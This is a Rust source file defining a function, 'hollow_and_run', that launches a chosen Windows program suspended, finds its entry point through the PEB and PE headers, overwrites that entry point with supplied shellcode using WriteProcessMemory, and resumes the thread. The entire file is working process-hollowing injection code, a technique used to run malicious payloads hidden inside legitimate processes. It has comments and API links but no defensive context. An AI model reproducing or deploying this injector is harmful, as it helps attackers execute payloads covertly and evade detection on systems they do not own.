use core::ffi::c_void;
use std::ptr;
use windows::core::{PCSTR, PSTR};
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{
    CreateProcessA, ResumeThread, CREATE_SUSPENDED,
    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOA,
};
use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};

const E_LFANEW_OFFSET: usize = 0x3C;
const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
const POINTER_SIZE: u32 = usize::BITS >> 3;
const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;

pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
    // Create empty ProcessInformation struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
    let mut process_information = PROCESS_INFORMATION::default();

    // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
    let lp_command_line = PSTR::from_raw(format!("{target_process}\0").as_mut_ptr());
    let creation_result = unsafe {
        CreateProcessA(
            PCSTR::null(),
            lp_command_line,
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &STARTUPINFOA::default(),
            &mut process_information,
        )
    };
    if creation_result.is_err() {
        panic!("Could not create the suspended {target_process} with CreateProcessA");
    }

    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
    let process_handle = process_information.hProcess;
    let mut basic_information = PROCESS_BASIC_INFORMATION::default();
    if let Err(error) = unsafe {
        NtQueryInformationProcess(
            process_handle,
            PROCESSINFOCLASS::default(),
            &mut basic_information as *mut _ as *mut c_void,
            POINTER_SIZE_TIMES_SIX,
            &mut 0_u32,
        )
    } {
        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
    }

    // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
    let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
    let mut address_buffer = [0; POINTER_SIZE as usize];
    let read_result = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address as *const c_void,
            address_buffer.as_mut_ptr() as *mut c_void,
            POINTER_SIZE as usize,
            None,
        )
    };
    if read_result.is_err() {
        panic!("Could not read the address of the code base with ReadProcessMemory");
    }

    // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
    let mut header_buffer = [0_u8; 0x200];
    let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
    let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
    let read_result = unsafe {
        ReadProcessMemory(
            process_handle,
            pe_base_address as *const c_void,
            header_buffer.as_mut_ptr() as *mut c_void,
            0x200,
            None,
        )
    };
    if read_result.is_err() {
        panic!("Could not read the DOS header with ReadProcessMemory");
    } else if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
    }

    // Write the shellcode to the suspended process with WriteProcessMemory
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
    let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
    let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
    let entry_point_address = entry_point_rva as usize + pe_base_address;
    let write_result = unsafe {
        WriteProcessMemory(
            process_handle,
            entry_point_address as *const c_void,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            None,
        )
    };
    if write_result.is_err() {
        panic!("Could not write the shellcode to the suspended {target_process} with WriteProcessMemory");
    }

    // Start it back up with ResumeThread
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
    let resume_result = unsafe { ResumeThread(process_information.hThread) };
    if resume_result != 1 {
        panic!("Could not resume the suspended {target_process}'s execution");
    }
}
